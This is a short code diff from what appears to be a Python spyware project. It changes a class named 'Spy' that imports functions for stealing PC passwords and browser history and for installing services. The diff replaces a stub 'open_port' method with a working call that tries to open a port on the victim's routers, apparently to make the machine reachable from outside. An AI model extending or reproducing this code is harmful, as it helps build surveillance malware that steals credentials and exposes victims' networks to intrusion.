@@ -20,6 +20,7 @@ from spying.pc_passwords import get_secrets
 from spying.browser import get_browser_info, list_of_history_to_str
 from spying.service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
     install_service, remove_services
+from spying.ports import open_port
 
 
 class Spy:
@@ -408,5 +409,9 @@ class Spy:
         return remove_services(services, nssm_path)
 
     @staticmethod
-    def open_port(port: int):
-        return True
+    def open_port(port: int) -> List[Tuple[str, bool, str]]:
+        """
+        Opens a port in the router.
+        Returns a list of every router it tryed. each item is a tuple of router ip, whether succeeded and error message.
+        """
+        return open_port(port)
